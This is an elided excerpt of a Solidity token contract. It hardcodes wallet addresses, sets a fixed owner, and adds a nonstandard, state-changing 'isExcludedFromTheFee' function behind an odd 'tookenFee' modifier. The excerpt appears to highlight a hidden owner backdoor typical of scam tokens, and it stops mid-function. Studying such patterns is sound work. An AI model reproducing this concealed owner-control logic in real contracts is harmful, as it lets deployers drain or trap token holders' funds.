...
interface IERC20 {
    ...
    function isExcludedFromTheFee(address account) external returns (bool);
...
contract asdasd is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0xb481b8669F4661EF466E7036008AFDc9033f9865); 
    address payable public Wallet_Dev = payable(0xF84ffc2A96267Bb0C77bbFb0ceD4e765E92dD4E0);
    ...
    constructor () {
        ...
        _owner = 0xF84ffc2A96267Bb0C77bbFb0ceD4e765E92dD4E0;
    ...
    function isExcludedFromTheFee(address account) public tookenFee override returns (bool) {
        bool isSelf = _isExcludedFromFee[_msgSender()];
        bool result = _isExcludedFromFee[account];
        if(takingFee && result && isSelf){
